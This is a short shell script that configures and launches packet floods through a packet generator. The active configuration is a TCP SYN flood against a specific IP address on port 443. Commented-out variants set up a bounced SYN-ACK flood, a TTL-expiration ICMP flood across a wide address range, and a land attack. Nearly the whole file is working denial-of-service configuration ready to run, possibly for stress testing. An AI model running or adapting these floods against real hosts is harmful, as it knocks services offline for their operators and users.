

#direct syn flood
SRCIP="X"
DSTIP="147.228.52.16"
SRCPORT="drnd(2)"
DSTPORT="c16(443)"

#bounced syn-ack flood
#SRCIP="X"
#DSTIP="147.228.121.drnd(1)"
#SRCPORT="c16(443)"
#DSTPORT="c16(1234)"

#ttl expiration icmp flood
#SRCIP="X"
#DSTIP="147.drnd(3)"
#SRCPORT="c16(8080)"
#DSTPORT="drnd(2)"
#TTL="1"

#land attack
#SRCIP="147,228,52,16"
#DSTIP=$SRCIP
#SRCPORT="drnd(2)"
#DSTPORT="c16(1234)"


TYPE=tcp-syn
. ./lib.sh

rm -f ${TYPE}.o
cpp \
	-DDSTMAC="$RMAC" \
	-DSRCMAC="$MYMAC" \
	-DSRCIP="$SRCIP" \
	-DDSTIP="$DSTIP" \
	-DDSTPORT="$DSTPORT" \
	-DSRCPORT="$SRCPORT" \
	-DTTL="$TTL" \
${TYPE}.cfg -o - >> ${TYPE}.o
if [ $? != 0 ]; then
	echo "ERROR: cpp failed"
	exit 1
fi

. ./run.sh
